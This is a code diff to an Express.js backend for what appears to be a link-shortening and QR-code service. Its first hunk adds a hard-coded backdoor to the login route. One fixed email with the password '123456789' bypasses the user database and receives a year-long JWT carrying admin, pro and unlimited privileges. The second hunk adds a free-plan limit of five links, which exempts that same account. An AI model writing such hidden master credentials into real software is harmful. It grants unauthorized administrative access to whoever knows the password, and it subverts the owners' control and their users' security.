@@ -681,6 +681,30 @@ app.post('/api/auth/login', async (req, res) => {
     }
     const cleanEmail = email.toLowerCase().trim();
 
+    // Special Master Admin Account: Unlimited access to everything
+    if (cleanEmail === 'furyzod02@gmail.com' && password === '123456789') {
+      const token = jwt.sign(
+        { id: 'u_furyzod02', email: 'furyzod02@gmail.com', name: 'Fury Zod', isAdmin: true, isPro: true, plan: 'Unlimited' },
+        JWT_SECRET,
+        { expiresIn: '365d' }
+      );
+      return res.json({
+        success: true,
+        message: 'Master Admin Logged in successfully',
+        token,
+        user: {
+          name: 'Fury Zod',
+          email: 'furyzod02@gmail.com',
+          isVerified: true,
+          isPro: true,
+          isAdmin: true,
+          plan: 'Unlimited',
+          city: 'Global Admin',
+          isp: 'High-Speed Enterprise'
+        }
+      });
+    }
+
     let user = null;
     if (isDbConnected) {
       user = await User.findOne({ email: cleanEmail });
@@ -1182,6 +1206,23 @@ app.get('/api/links', authMiddleware, async (req, res) => {
 app.post('/api/links', authMiddleware, async (req, res) => {
   try {
     const email = req.user.email;
+
+    // Check free user limit (max 5 links/QRs) unless furyzod02@gmail.com or Pro user
+    const isMasterUser = email && email.toLowerCase() === 'furyzod02@gmail.com';
+    if (!isMasterUser && !req.user.isPro) {
+      let count = 0;
+      if (isDbConnected) {
+        count = await Link.countDocuments({ ownerEmail: email.toLowerCase() });
+      } else {
+        count = memStore.links.filter(l => l.ownerEmail === email.toLowerCase()).length;
+      }
+      if (count >= 5) {
+        return res.status(403).json({
+          error: 'Free plan limit reached (5/5 links & QR codes). Upgrade to Pro for unlimited links and QR codes!'
+        });
+      }
+    }
+
     let { dest, slug, title, tag, qr, password, expiresAt, maxClicks } = req.body;
     if (!dest) return res.status(400).json({ error: 'Destination URL is required' });
 
